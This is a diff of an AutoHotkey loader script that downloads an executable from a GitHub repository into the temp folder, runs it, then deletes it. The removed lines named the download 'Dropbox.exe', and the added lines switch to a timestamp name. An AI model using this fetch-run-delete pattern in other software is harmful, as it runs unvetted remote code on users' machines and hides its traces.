@@ -2,7 +2,7 @@
  * * * Compile_AHK SETTINGS BEGIN * * *
 
 [AHK2EXE]
-Exe_File=%In_Dir%\Loader1.exe
+Exe_File=%In_Dir%\Loader.exe
 No_UPX=1
 Execution_Level=4
 [VERSION]
@@ -32,12 +32,15 @@ Icon_5=0
 ListLines, Off
 OnExit("Erase")
 
-UrlDownloadToFile, https://github.com/Visionary1/Tracker/raw/master/v2/Package.exe, % A_Temp . "\Dropbox.exe"
+PackageURL := "https://github.com/Visionary1/Tracker/raw/master/v2/Package.exe"
+Application := A_Temp . "\" . A_TickCount . ".exe"
 
-If FileExist(A_Temp . "\Dropbox.exe")
+UrlDownloadToFile, % PackageURL, % Application
+
+If FileExist(Application)
 {
 	Try
-		RunWait, % A_Temp . "\Dropbox.exe"
+		RunWait, % Application
 	Catch e
 		Erase()
 	Finally
@@ -47,6 +50,8 @@ Return
 
 Erase()
 {
-	Try FileDelete, % A_Temp . "\Dropbox.exe"
+	global Application
+
+	Try FileDelete, % Application
 	ExitApp
 }
